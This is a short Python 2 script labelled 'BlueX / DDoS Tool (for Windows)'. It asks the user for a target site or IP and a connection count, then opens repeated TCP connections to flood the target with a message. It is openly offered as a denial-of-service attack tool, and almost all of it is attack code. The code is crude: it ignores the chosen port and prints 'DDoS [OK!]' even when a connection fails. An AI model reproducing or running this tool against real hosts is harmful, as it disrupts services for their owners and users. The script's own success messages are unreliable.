import time
import socket
import os
import sys
import string

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()

print ("X-------------BlueX-------------X")
print ("BlueX / DDoS Tool (for Windows)")
print ("")
host=raw_input( "Site / IP you want to DDoS> " )
port=input( "Port (Default: 80)> " )
message=raw_input( "Message for IP (Default: Hello!)> " )
conn=input( "How many connections? (Default: 10)> " )
ip = socket.gethostbyname( host )
print("")
print ("---------------------------------")
print ("Starting attack to:")
print ("Host_name: "+ host +"")
print ("IP: " + ip + "")
print ("---------------------------------")
print ("")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("Fail!")
    print ( "DDoS [OK!]")
    ddos.close()
for i in range(1, conn):
    dos()
print("")
print ("X-------------BlueX-------------X")
print("Done!")
if __name__ == "__main__":
    answer = raw_input("Continue in DDoS? (Y/N)")
    if answer.strip() in "y Y yes Yes YES".split():
        os.system('cls')
        restart_program()
    else:
        os.system(curdir+"\app\main.py")
